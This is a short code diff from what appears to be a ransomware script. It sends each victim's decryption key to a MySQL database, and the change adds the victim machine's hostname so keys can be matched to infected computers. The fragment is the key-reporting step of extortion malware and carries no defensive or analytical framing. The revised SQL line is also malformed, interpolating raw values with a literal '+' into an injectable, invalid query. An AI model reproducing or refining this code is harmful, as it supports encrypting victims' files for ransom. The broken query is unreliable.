@@ -22,8 +22,8 @@ conn = mysql.connector.connect(
 )
 c = conn.cursor()
 
-# Sending key to database
-c.execute("INSERT INTO decryption_keys (keys) VALUES ('%s')" % (key,))
+# Sending key and id to database
+c.execute(f"INSERT INTO decryption_keys (keys) VALUES ({key} + ' ' + {gethostname()})")
 conn.commit()
 
 # Get base file name
